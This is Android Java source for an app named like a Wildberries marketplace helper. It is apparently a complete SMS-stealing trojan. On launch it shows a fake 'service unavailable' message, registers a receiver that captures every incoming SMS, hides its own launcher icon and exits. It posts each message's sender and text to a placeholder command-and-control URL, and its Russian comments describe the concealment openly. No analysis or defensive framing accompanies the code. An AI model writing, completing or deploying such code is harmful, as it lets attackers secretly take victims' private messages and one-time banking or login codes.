package com.wildberries.helper;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private static final String C2_URL = "https://your-c2-server.com/collect";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Показываем безобидный текст и сразу закрываемся
        Toast.makeText(this, "Сервис временно недоступен", Toast.LENGTH_LONG).show();

        // Регистрируем SMS-перехватчик
        registerReceiver(new SmsReceiver(),
                new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION));

        // Скрываем иконку через 3 секунды
        new Handler().postDelayed(() -> {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }, 3000);

        // Закрываем Activity
        finish();
    }

    // ===================================================================
    // SMS-ПЕРЕХВАТЧИК
    // ===================================================================
    public static class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
                SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
                for (SmsMessage msg : messages) {
                    String body = msg.getMessageBody();
                    String sender = msg.getOriginatingAddress();
                    sendToC2("sms", "sender=" + sender + "&body=" + body);
                }
            }
        }

        private void sendToC2(String type, String data) {
            try {
                URL url = new URL("https://your-c2-server.com/collect");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.getOutputStream().write(("type=" + type + "&" + data).getBytes());
                conn.getOutputStream().close();
            } catch (Exception ignored) {}
        }
    }
}
